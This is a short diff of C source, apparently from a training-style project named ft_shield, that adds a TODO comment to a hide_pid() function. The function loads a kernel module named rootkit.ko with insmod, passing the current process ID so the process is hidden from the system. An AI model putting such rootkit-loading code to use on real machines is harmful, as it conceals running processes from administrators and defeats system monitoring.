@@ -64,6 +64,7 @@ void hide_pid(void) {
 	int pid = getpid();
 	char cmd[256];
 
+	// TODO Dont use full path
 	snprintf(cmd, sizeof(cmd), "insmod %s hidden_pid=%d", "/home/vagrant/ft_shield/srcs/modules/rootkit.ko", pid);
 	system(cmd);
 }
